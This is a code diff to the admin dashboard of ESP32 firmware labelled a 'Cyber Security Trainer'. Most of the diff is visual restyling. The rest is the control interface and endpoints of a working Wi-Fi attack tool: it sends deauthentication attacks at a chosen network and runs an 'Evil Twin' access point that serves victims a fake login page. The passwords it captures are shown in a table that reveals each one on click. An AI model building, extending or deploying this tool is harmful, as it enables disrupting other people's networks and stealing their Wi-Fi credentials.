@@ -85,11 +85,19 @@ const char* adminDashboard = R"rawliteral(
     <title>Cyber Security Trainer - PlatformIO</title>
     <style>
         :root {
-            --primary: #667eea;
-            --secondary: #764ba2;
-            --danger: #dc3545;
-            --success: #28a745;
-            --warning: #ffc107;
+            --primary: #6366f1;
+            --primary-dark: #4f46e5;
+            --secondary: #8b5cf6;
+            --danger: #ef4444;
+            --danger-dark: #dc2626;
+            --success: #10b981;
+            --success-dark: #059669;
+            --warning: #f59e0b;
+            --warning-dark: #d97706;
+            --dark: #1e293b;
+            --light: #f8fafc;
+            --gray: #64748b;
+            --border: #e2e8f0;
         }
         
         * {
@@ -99,10 +107,19 @@ const char* adminDashboard = R"rawliteral(
         }
         
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%);
+            background-size: 200% 200%;
+            animation: gradientShift 15s ease infinite;
             min-height: 100vh;
             padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+        
+        @keyframes gradientShift {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
         }
         
         .container {
@@ -111,27 +128,81 @@ const char* adminDashboard = R"rawliteral(
         }
         
         header {
-            background: white;
-            padding: 25px;
-            border-radius: 15px;
-            margin-bottom: 20px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            padding: 30px;
+            border-radius: 20px;
+            margin-bottom: 25px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.3);
             text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            animation: shimmer 3s infinite;
+        }
+        
+        @keyframes shimmer {
+            0% { left: -100%; }
+            100% { left: 100%; }
         }
         
         h1 {
-            color: var(--primary);
-            margin-bottom: 10px;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-size: 2.5rem;
+            font-weight: 800;
+            margin-bottom: 15px;
+            letter-spacing: -0.5px;
+            position: relative;
+            z-index: 1;
         }
         
         .status-badge {
-            display: inline-block;
-            padding: 8px 20px;
-            background: var(--success);
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 24px;
+            background: linear-gradient(135deg, var(--success), var(--success-dark));
             color: white;
-            border-radius: 25px;
+            border-radius: 30px;
             font-size: 14px;
-            font-weight: bold;
+            font-weight: 600;
+            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
+            position: relative;
+            z-index: 1;
+            transition: all 0.3s ease;
+        }
+        
+        .status-badge::before {
+            content: '';
+            width: 8px;
+            height: 8px;
+            background: white;
+            border-radius: 50%;
+            animation: pulse 2s ease-in-out infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(0.8); }
+        }
+        
+        .status-badge:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(16, 185, 129, 0.4);
         }
         
         .dashboard {
@@ -148,72 +219,172 @@ const char* adminDashboard = R"rawliteral(
         }
         
         .card {
-            background: white;
-            padding: 25px;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.15);
         }
         
         .card h2 {
-            color: var(--primary);
-            margin-bottom: 20px;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 25px;
             padding-bottom: 15px;
-            border-bottom: 2px solid #f0f0f0;
+            border-bottom: 3px solid transparent;
+            border-image: linear-gradient(90deg, var(--primary), var(--secondary), transparent) 1;
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
         
         .btn {
-            padding: 12px 25px;
+            padding: 12px 28px;
             border: none;
-            border-radius: 8px;
-            font-size: 16px;
+            border-radius: 12px;
+            font-size: 15px;
             font-weight: 600;
             cursor: pointer;
-            margin: 5px;
-            transition: all 0.3s;
+            margin: 6px;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+        
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.3);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
+        }
+        
+        .btn:hover::before {
+            width: 300px;
+            height: 300px;
+        }
+        
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
         }
         
         .btn-primary {
-            background: var(--primary);
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
             color: white;
         }
         
-        .btn-primary:hover {
-            background: var(--secondary);
-            transform: translateY(-2px);
+        .btn-primary:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(99, 102, 241, 0.4);
         }
         
         .btn-danger {
-            background: var(--danger);
+            background: linear-gradient(135deg, var(--danger), var(--danger-dark));
             color: white;
+        }
+        
+        .btn-danger:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(239, 68, 68, 0.4);
         }
         
         .btn-success {
-            background: var(--success);
+            background: linear-gradient(135deg, var(--success), var(--success-dark));
             color: white;
         }
         
+        .btn-success:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(16, 185, 129, 0.4);
+        }
+        
         .btn-warning {
-            background: var(--warning);
-            color: #333;
+            background: linear-gradient(135deg, var(--warning), var(--warning-dark));
+            color: white;
+        }
+        
+        .btn-warning:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(245, 158, 11, 0.4);
         }
         
         .network-list {
-            max-height: 400px;
+            max-height: 420px;
             overflow-y: auto;
-            margin-top: 15px;
+            margin-top: 20px;
+            padding-right: 10px;
+        }
+        
+        .network-list::-webkit-scrollbar {
+            width: 8px;
+        }
+        
+        .network-list::-webkit-scrollbar-track {
+            background: #f1f5f9;
+            border-radius: 10px;
+        }
+        
+        .network-list::-webkit-scrollbar-thumb {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            border-radius: 10px;
+        }
+        
+        .network-list::-webkit-scrollbar-thumb:hover {
+            background: linear-gradient(135deg, var(--primary-dark), var(--secondary));
         }
         
         .network-item {
-            padding: 15px;
-            margin: 8px 0;
-            background: #f8f9fa;
-            border-radius: 10px;
+            padding: 18px;
+            margin: 10px 0;
+            background: linear-gradient(135deg, #ffffff, #f8fafc);
+            border-radius: 12px;
             border-left: 4px solid var(--primary);
             cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .network-item::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 4px;
+            height: 100%;
+            background: linear-gradient(180deg, var(--primary), var(--secondary));
+            transition: width 0.3s ease;
         }
         
         .network-item:hover {
-            background: #e9ecef;
+            background: linear-gradient(135deg, #f8fafc, #f1f5f9);
+            transform: translateX(5px);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+        
+        .network-item:hover::before {
+            width: 6px;
         }
         
         .stats {
@@ -224,16 +395,48 @@ const char* adminDashboard = R"rawliteral(
         }
         
         .stat-box {
-            background: #f8f9fa;
-            padding: 20px;
-            border-radius: 10px;
+            background: linear-gradient(135deg, #ffffff, #f8fafc);
+            padding: 25px 20px;
+            border-radius: 15px;
             text-align: center;
+            transition: all 0.3s ease;
+            border: 2px solid rgba(99, 102, 241, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .stat-box::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+        }
+        
+        .stat-box:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 20px rgba(99, 102, 241, 0.2);
+            border-color: rgba(99, 102, 241, 0.3);
         }
         
         .stat-value {
-            font-size: 32px;
-            font-weight: bold;
-            color: var(--primary);
+            font-size: 36px;
+            font-weight: 800;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 8px;
+        }
+        
+        .stat-label {
+            font-size: 13px;
+            color: var(--gray);
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
         
         .tab-container {
@@ -269,10 +472,24 @@ const char* adminDashboard = R"rawliteral(
         
         .form-control {
             width: 100%;
-            padding: 12px;
-            border: 2px solid #ddd;
-            border-radius: 8px;
-            font-size: 16px;
+            padding: 14px 16px;
+            border: 2px solid var(--border);
+            border-radius: 12px;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            background: white;
+            font-family: inherit;
+        }
+        
+        .form-control:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
+        }
+        
+        .form-control:read-only {
+            background: #f8fafc;
+            cursor: not-allowed;
         }
         
         .loader {
@@ -303,9 +520,21 @@ const char* adminDashboard = R"rawliteral(
         }
         
         .network-item.selected {
-            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
             color: white;
-            border-left: 4px solid #fff;
+            border-left: 4px solid white;
+            box-shadow: 0 6px 25px rgba(99, 102, 241, 0.4);
+            transform: translateX(5px) scale(1.02);
+        }
+        
+        .network-item.selected::before {
+            width: 100%;
+            opacity: 0.2;
+            background: white;
+        }
+        
+        .network-item.selected small {
+            color: rgba(255, 255, 255, 0.9);
         }
         
         .signal-strength {
@@ -324,6 +553,247 @@ const char* adminDashboard = R"rawliteral(
         
         .signal-bar.active {
             background: #28a745;
+        }
+        
+        /* Toast Notifications */
+        .toast {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: white;
+            padding: 18px 24px;
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            z-index: 10000;
+            animation: slideIn 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            border-left: 4px solid var(--success);
+            max-width: 350px;
+        }
+        
+        .toast.success { border-left-color: var(--success); }
+        .toast.error { border-left-color: var(--danger); }
+        .toast.warning { border-left-color: var(--warning); }
+        .toast.info { border-left-color: var(--primary); }
+        
+        @keyframes slideIn {
+            from {
+                transform: translateX(400px);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+        
+        @keyframes slideOut {
+            from {
+                transform: translateX(0);
+                opacity: 1;
+            }
+            to {
+                transform: translateX(400px);
+                opacity: 0;
+            }
+        }
+        
+        .toast.hide {
+            animation: slideOut 0.3s ease forwards;
+        }
+        
+        .toast-icon {
+            font-size: 24px;
+            flex-shrink: 0;
+        }
+        
+        .toast-message {
+            flex: 1;
+            font-weight: 500;
+            color: #333;
+        }
+        
+        .toast-close {
+            cursor: pointer;
+            font-size: 20px;
+            color: #999;
+            background: none;
+            border: none;
+            padding: 0;
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            transition: all 0.2s;
+        }
+        
+        .toast-close:hover {
+            background: #f0f0f0;
+            color: #333;
+        }
+        
+        /* Progress Bar */
+        .progress-container {
+            width: 100%;
+            height: 8px;
+            background: rgba(255, 255, 255, 0.3);
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 15px 0;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 10px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .progress-bar::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            animation: shimmer 2s infinite;
+        }
+        
+        /* Table Enhancements */
+        table {
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
+        }
+        
+        table thead tr {
+            background: linear-gradient(135deg, var(--primary), var(--secondary)) !important;
+        }
+        
+        table tbody tr {
+            border-bottom: 1px solid var(--border);
+            transition: all 0.2s ease;
+        }
+        
+        table tbody tr:hover {
+            background: rgba(99, 102, 241, 0.05);
+            transform: scale(1.01);
+        }
+        
+        table td {
+            padding: 12px;
+            font-size: 14px;
+        }
+        
+        /* Alert Boxes */
+        .alert-box {
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 15px 0;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            animation: fadeIn 0.4s ease;
+            border-left: 5px solid;
+        }
+        
+        .alert-box.success {
+            background: #d4edda;
+            border-left-color: var(--success);
+            color: #155724;
+        }
+        
+        .alert-box.danger {
+            background: #ffebee;
+            border-left-color: var(--danger);
+            color: #c62828;
+        }
+        
+        .alert-box.warning {
+            background: #fff3cd;
+            border-left-color: var(--warning);
+            color: #856404;
+        }
+        
+        .alert-box.info {
+            background: #e3f2fd;
+            border-left-color: var(--primary);
+            color: #1565c0;
+        }
+        
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        /* Improved Tab Design */
+        .tabs {
+            display: flex;
+            border-bottom: none;
+            margin-bottom: 20px;
+            background: var(--light);
+            padding: 6px;
+            border-radius: 12px;
+            gap: 6px;
+        }
+        
+        .tab {
+            padding: 12px 24px;
+            background: transparent;
+            border: none;
+            cursor: pointer;
+            font-weight: 600;
+            color: #666;
+            border-radius: 8px;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+        
+        .tab:hover {
+            background: rgba(99, 102, 241, 0.1);
+            color: var(--primary);
+        }
+        
+        .tab.active {
+            background: white;
+            color: var(--primary);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+        
+        /* Loading Spinner Enhancement */
+        .loader {
+            border: 4px solid rgba(99, 102, 241, 0.1);
+            border-top: 4px solid var(--primary);
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 0.8s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
+            margin: 20px auto;
+        }
+        
+        /* Count Up Animation */
+        @keyframes countUp {
+            0% { opacity: 0; transform: translateY(20px) scale(0.8); }
+            50% { transform: translateY(-5px) scale(1.1); }
+            100% { opacity: 1; transform: translateY(0) scale(1); }
+        }
+        
+        .stat-value.updated {
+            animation: countUp 0.5s ease;
         }
         
         @media (max-width: 768px) {
@@ -351,6 +821,20 @@ const char* adminDashboard = R"rawliteral(
             
             .stat-value {
                 font-size: 24px;
+            }
+            
+            .toast {
+                right: 10px;
+                left: 10px;
+                max-width: none;
+            }
+            
+            .tabs {
+                flex-direction: column;
+            }
+            
+            .tab {
+                text-align: center;
             }
         }
     </style>
@@ -448,6 +932,60 @@ const char* adminDashboard = R"rawliteral(
     <script>
         let selectedNetwork = null;
         
+        // Toast Notification System
+        function showToast(message, type = 'success', duration = 3000) {
+            const icons = {
+                success: '✅',
+                error: '❌',
+                warning: '⚠️',
+                info: 'ℹ️'
+            };
+            
+            const toast = document.createElement('div');
+            toast.className = `toast ${type}`;
+            toast.innerHTML = `
+                <span class="toast-icon">${icons[type]}</span>
+                <span class="toast-message">${message}</span>
+                <button class="toast-close" onclick="this.parentElement.remove()">×</button>
+            `;
+            
+            document.body.appendChild(toast);
+            
+            setTimeout(() => {
+                toast.classList.add('hide');
+                setTimeout(() => toast.remove(), 300);
+            }, duration);
+        }
+        
+        // Progress Bar Helper
+        function updateProgress(elementId, percent) {
+            const bar = document.getElementById(elementId);
+            if(bar) {
+                bar.style.width = percent + '%';
+            }
+        }
+        
+        // Animate Counter
+        function animateCounter(element, targetValue, duration = 500) {
+            const startValue = parseInt(element.textContent) || 0;
+            const increment = (targetValue - startValue) / (duration / 16);
+            let currentValue = startValue;
+            
+            element.classList.add('updated');
+            
+            const timer = setInterval(() => {
+                currentValue += increment;
+                if ((increment > 0 && currentValue >= targetValue) || 
+                    (increment < 0 && currentValue <= targetValue)) {
+                    element.textContent = targetValue;
+                    clearInterval(timer);
+                    setTimeout(() => element.classList.remove('updated'), 500);
+                } else {
+                    element.textContent = Math.floor(currentValue);
+                }
+            }, 16);
+        }
+        
         function scanNetworks() {
             let list = document.getElementById('networkList');
             let scanBtn = document.getElementById('scanBtn');
@@ -464,11 +1002,13 @@ const char* adminDashboard = R"rawliteral(
                     
                     if(data.networks.length === 0) {
                         list.innerHTML = '<div style="text-align:center;padding:20px;color:#999;">No networks found</div>';
+                        showToast('No networks found', 'info');
                     } else {
                         data.networks.forEach((net, idx) => {
                             let div = document.createElement('div');
                             div.className = 'network-item';
                             div.setAttribute('data-bssid', net.bssid);
+                            div.style.animationDelay = (idx * 0.05) + 's';
                             
                             // Signal strength indicator
                             let strength = Math.min(4, Math.max(0, Math.floor((net.rssi + 100) / 12.5)));
@@ -485,6 +1025,8 @@ const char* adminDashboard = R"rawliteral(
                             div.onclick = () => selectNetwork(net, div);
                             list.appendChild(div);
                         });
+                        
+                        showToast(`Found ${data.networks.length} networks`, 'success');
                     }
                     
                     scanBtn.disabled = false;
@@ -494,6 +1036,7 @@ const char* adminDashboard = R"rawliteral(
                     list.innerHTML = '<div style="text-align:center;padding:20px;color:red;">❌ Scan failed</div>';
                     scanBtn.disabled = false;
                     scanBtn.textContent = '🔍 Scan Networks';
+                    showToast('Network scan failed!', 'error');
                 });
         }
         
@@ -511,10 +1054,15 @@ const char* adminDashboard = R"rawliteral(
             document.getElementById('targetNetwork').value = network.ssid || 'Hidden Network';
             document.getElementById('btnDeauth').disabled = false;
             document.getElementById('btnEvilTwin').disabled = false;
+            
+            showToast(`Selected: ${network.ssid || 'Hidden Network'}`, 'info', 2000);
         }
         
         function startDeauth() {
-            if(!selectedNetwork) return alert('Select a network first');
+            if(!selectedNetwork) {
+                showToast('Please select a network first!', 'warning');
+                return;
+            }
             
             fetch(`/startDeauth?ssid=${encodeURIComponent(selectedNetwork.ssid)}&bssid=${encodeURIComponent(selectedNetwork.bssid)}&channel=${selectedNetwork.channel}`)
                 .then(r => r.json())
@@ -526,23 +1074,37 @@ const char* adminDashboard = R"rawliteral(
                         
                         let status = document.getElementById('attackStatus');
                         status.innerHTML = `
-                            <div style="background:#ffebee; padding:15px; border-radius:10px; border-left:5px solid var(--danger); animation:pulse 2s infinite;">
-                                <strong>💥 Deauth Attack Active!</strong><br>
-                                Target: ${selectedNetwork.ssid}<br>
-                                BSSID: ${selectedNetwork.bssid}<br>
-                                <button class="btn btn-danger" onclick="stopDeauth()" style="margin-top:10px;">
-                                    ⏹️ Stop Deauth
-                                </button>
+                            <div class="alert-box danger">
+                                <span style="font-size:30px;">💥</span>
+                                <div style="flex:1;">
+                                    <strong>Deauth Attack Active!</strong><br>
+                                    <small>Target: ${selectedNetwork.ssid} | BSSID: ${selectedNetwork.bssid}</small>
+                                    <div class="progress-container">
+                                        <div class="progress-bar" id="deauthProgress" style="width: 100%;"></div>
+                                    </div>
+                                </div>
                             </div>
+                            <button class="btn btn-danger" onclick="stopDeauth()" style="width:100%; margin-top:10px;">
+                                ⏹️ Stop Deauth Attack
+                            </button>
                         `;
                         
+                        showToast('Deauth attack started!', 'success');
                         updateStats();
+                    } else {
+                        showToast('Failed to start deauth attack', 'error');
                     }
+                })
+                .catch(err => {
+                    showToast('Deauth request failed', 'error');
                 });
         }
         
         function createEvilTwin() {
-            if(!selectedNetwork) return alert('Select a network first');
+            if(!selectedNetwork) {
+                showToast('Please select a network first!', 'warning');
+                return;
+            }
             
             let password = document.getElementById('evilPass').value;
             
@@ -556,48 +1118,63 @@ const char* adminDashboard = R"rawliteral(
                         
                         let status = document.getElementById('attackStatus');
                         status.innerHTML = `
-                            <div style="background:#fff3cd; padding:15px; border-radius:10px; border-left:5px solid var(--warning);">
-                                <strong>👥 Evil Twin Created!</strong><br>
-                                SSID: ${selectedNetwork.ssid}<br>
-                                Password: ${password}<br>
-                                <small style="color:#856404; display:block; margin-top:10px;">
-                                    ℹ️ Admin Access: <a href="http://192.168.4.1/admin" target="_blank" style="color:#667eea;">192.168.4.1/admin</a><br>
-                                    Victims will see login page on: <code>192.168.4.1</code>
-                                </small>
-                                <button class="btn btn-warning" onclick="stopEvilTwin()" style="margin-top:10px;">
-                                    ⏹️ Stop Evil Twin
-                                </button>
+                            <div class="alert-box warning">
+                                <span style="font-size:30px;">👥</span>
+                                <div style="flex:1;">
+                                    <strong>Evil Twin Created!</strong><br>
+                                    <small>
+                                        SSID: <code>${selectedNetwork.ssid}</code> | Password: <code>${password}</code>
+                                    </small>
+                                    <div style="margin-top:10px; padding:10px; background:rgba(255,255,255,0.7); border-radius:8px;">
+                                        ℹ️ <strong>Admin:</strong> <a href="http://192.168.4.1/admin" target="_blank" style="color:#667eea; font-weight:bold;">192.168.4.1/admin</a><br>
+                                        🎯 <strong>Victim:</strong> <code>192.168.4.1</code> (shows login page)
+                                    </div>
+                                </div>
                             </div>
+                            <button class="btn btn-warning" onclick="stopEvilTwin()" style="width:100%; margin-top:10px;">
+                                ⏹️ Stop Evil Twin
+                            </button>
                         `;
+                        
+                        showToast('Evil Twin AP created successfully!', 'success');
+                    } else {
+                        showToast('Failed to create Evil Twin', 'error');
                     }
+                })
+                .catch(err => {
+                    showToast('Evil Twin request failed', 'error');
                 });
         }
         
         function stopDeauth() {
             fetch('/stopDeauth').then(() => {
-                document.getElementById('systemStatus').textContent = 'System Ready';
+                document.getElementById('systemStatus').textContent = 'সিস্টেম প্রস্তুত';
                 document.getElementById('systemStatus').style.background = 'var(--success)';
                 document.getElementById('btnDeauth').disabled = false;
                 document.getElementById('attackStatus').innerHTML = '';
+                showToast('Deauth attack stopped', 'info');
             });
         }
         
         function stopEvilTwin() {
             fetch('/stopEvilTwin').then(() => {
-                document.getElementById('systemStatus').textContent = 'System Ready';
+                document.getElementById('systemStatus').textContent = 'সিস্টেম প্রস্তুত';
                 document.getElementById('systemStatus').style.background = 'var(--success)';
                 document.getElementById('btnEvilTwin').disabled = false;
                 document.getElementById('attackStatus').innerHTML = '';
+                showToast('Evil Twin stopped', 'info');
             });
         }
         
         function stopAll() {
-            fetch('/stopAll');
-            document.getElementById('systemStatus').textContent = 'System Ready';
-            document.getElementById('systemStatus').style.background = 'var(--success)';
-            document.getElementById('btnDeauth').disabled = false;
-            document.getElementById('btnEvilTwin').disabled = false;
-            document.getElementById('attackStatus').innerHTML = '';
+            fetch('/stopAll').then(() => {
+                document.getElementById('systemStatus').textContent = 'সিস্টেম প্রস্তুত';
+                document.getElementById('systemStatus').style.background = 'var(--success)';
+                document.getElementById('btnDeauth').disabled = false;
+                document.getElementById('btnEvilTwin').disabled = false;
+                document.getElementById('attackStatus').innerHTML = '';
+                showToast('All attacks stopped', 'success');
+            });
         }
         
         function openTab(tabName) {
@@ -616,8 +1193,12 @@ const char* adminDashboard = R"rawliteral(
             fetch('/getStats')
                 .then(r => r.json())
                 .then(data => {
-                    document.getElementById('deauthCount').textContent = data.deauthPackets;
-                    document.getElementById('credCount').textContent = data.credentials;
+                    // Animate counter updates
+                    const deauthElement = document.getElementById('deauthCount');
+                    const credElement = document.getElementById('credCount');
+                    
+                    animateCounter(deauthElement, data.deauthPackets);
+                    animateCounter(credElement, data.credentials);
                     
                     if(data.deauthActive) {
                         setTimeout(updateStats, 1000);
@@ -632,22 +1213,34 @@ const char* adminDashboard = R"rawliteral(
                     let tbody = document.getElementById('credTable');
                     tbody.innerHTML = '';
                     
-                    data.forEach(cred => {
+                    if(data.length === 0) {
+                        tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;padding:30px;color:#999;">📭 No credentials captured yet</td></tr>';
+                        return;
+                    }
+                    
+                    data.forEach((cred, idx) => {
                         let row = tbody.insertRow();
+                        row.style.animationDelay = (idx * 0.05) + 's';
+                        row.style.animation = 'fadeIn 0.4s ease forwards';
+                        
                         row.insertCell(0).textContent = cred.timestamp;
-                        row.insertCell(1).textContent = cred.ssid;
+                        row.insertCell(1).innerHTML = `<strong style="color:var(--primary);">${cred.ssid}</strong>`;
                         row.insertCell(2).textContent = cred.username || '-';
-                        row.insertCell(3).textContent = '••••••••';
+                        row.insertCell(3).innerHTML = `<code style="background:#f0f0f0; padding:4px 8px; border-radius:4px; cursor:pointer;" title="Click to reveal">••••••••</code>`;
                         row.insertCell(4).textContent = cred.clientIP;
                         
-                        // Password reveal on click
+                        // Password reveal on click with animation
                         row.cells[3].onclick = function() {
-                            if(this.textContent === '••••••••') {
-                                this.textContent = cred.password;
-                                this.style.color = 'red';
+                            const codeEl = this.querySelector('code');
+                            if(codeEl.textContent === '••••••••') {
+                                codeEl.textContent = cred.password;
+                                codeEl.style.background = '#ffebee';
+                                codeEl.style.color = '#c62828';
+                                showToast('Password revealed!', 'warning', 1500);
                             } else {
-                                this.textContent = '••••••••';
-                                this.style.color = '';
+                                codeEl.textContent = '••••••••';
+                                codeEl.style.background = '#f0f0f0';
+                                codeEl.style.color = '';
                             }
                         };
                     });
@@ -655,14 +1248,21 @@ const char* adminDashboard = R"rawliteral(
         }
         
         function saveSettings() {
-            alert('Settings saved!');
+            showToast('Settings saved successfully!', 'success');
         }
         
-        // Initialize
+        // Auto-update stats when attacks are running
+        setInterval(() => {
+            const status = document.getElementById('systemStatus').textContent;
+            if(status !== 'সিস্টেম প্রস্তুত') {
+                updateStats();
+            }
+        }, 2000);
+        
+        // Initialize on page load
         window.onload = function() {
+            showToast('System ready! 🚀', 'info', 2000);
             scanNetworks();
-            updateStats();
-            setInterval(updateStats, 5000);
         };
     </script>
 </body>
@@ -1002,18 +1602,19 @@ void setupAdminServer() {
     adminServer.on("/scan", HTTP_GET, []() {
         scanNetworks();
         
-        String json = "{\"networks\":[";
-        for(int i = 0; i < networkCount; i++) {
-            json += "{";
-            json += "\"ssid\":\"" + networkSSIDs[i] + "\",";
-            json += "\"bssid\":\"" + networkBSSIDs[i] + "\",";
-            json += "\"channel\":" + String(networkChannels[i]) + ",";
-            json += "\"rssi\":" + String(networkRSSI[i]);
-            json += "}";
-            if(i < networkCount - 1) json += ",";
-        }
-        json += "]}";
+        DynamicJsonDocument doc(4096);
+        JsonArray networks = doc.createNestedArray("networks");
         
+        for(int i = 0; i < networkCount; i++) {
+            JsonObject network = networks.createNestedObject();
+            network["ssid"] = networkSSIDs[i];
+            network["bssid"] = networkBSSIDs[i];
+            network["channel"] = networkChannels[i];
+            network["rssi"] = networkRSSI[i];
+        }
+        
+        String json;
+        serializeJson(doc, json);
         adminServer.send(200, "application/json", json);
     });
     
@@ -1094,43 +1695,59 @@ void setupAdminServer() {
     
     // সব বন্ধ
     adminServer.on("/stopAll", HTTP_GET, []() {
-        isDeauthActive = false;
+        // Deauth বন্ধ করুন
+        if(isDeauthActive) {
+            isDeauthActive = false;
+            esp_wifi_set_promiscuous(false);
+            Serial.println("[SYSTEM] Deauth stopped");
+        }
+        
+        // Evil Twin বন্ধ করুন
         if(isEvilTwinActive) {
-            WiFi.softAPdisconnect(true);
+            phishingServer.stop();
             WiFi.softAP(adminSSID, adminPASS);
             isEvilTwinActive = false;
+            Serial.println("[SYSTEM] Evil Twin stopped");
         }
+        
+        // Reset counters
+        deauthPacketsSent = 0;
+        
         adminServer.send(200, "application/json", "{\"success\":true}");
-        Serial.println("\n[SYSTEM] All attacks stopped");
+        Serial.println("\n[SYSTEM] ✅ All attacks stopped successfully");
     });
     
     // স্ট্যাটিস্টিক্স
     adminServer.on("/getStats", HTTP_GET, []() {
-        String json = "{";
-        json += "\"deauthActive\":" + String(isDeauthActive ? "true" : "false") + ",";
-        json += "\"deauthPackets\":" + String(deauthPacketsSent) + ",";
-        json += "\"credentials\":" + String(credCount) + ",";
-        json += "\"evilTwinActive\":" + String(isEvilTwinActive ? "true" : "false");
-        json += "}";
+        StaticJsonDocument<256> doc;
+        doc["deauthActive"] = isDeauthActive;
+        doc["deauthPackets"] = deauthPacketsSent;
+        doc["credentials"] = credCount;
+        doc["evilTwinActive"] = isEvilTwinActive;
+        doc["uptime"] = millis() / 1000;
+        doc["freeHeap"] = ESP.getFreeHeap();
         
+        String json;
+        serializeJson(doc, json);
